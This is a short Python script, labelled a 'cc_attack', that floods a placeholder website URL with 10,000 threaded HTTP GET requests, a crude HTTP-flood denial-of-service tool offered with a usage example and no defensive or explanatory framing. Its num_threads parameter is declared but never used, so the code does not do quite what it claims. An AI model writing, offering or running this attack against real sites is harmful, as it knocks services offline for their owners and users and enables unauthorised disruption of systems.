import requests
import threading

def send_request(url):
    try:
        response = requests.get(url, timeout=1)
        print(f"Request success: {response.status_code}")
    except requests.RequestException as e:
        print(f"Request fail: {e}")

def cc_attack(url, num_threads, num_requests):
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# usage example
target_url = "Website URL"
num_threads = 1000
num_requests = 10000

cc_attack(target_url, num_threads, num_requests)
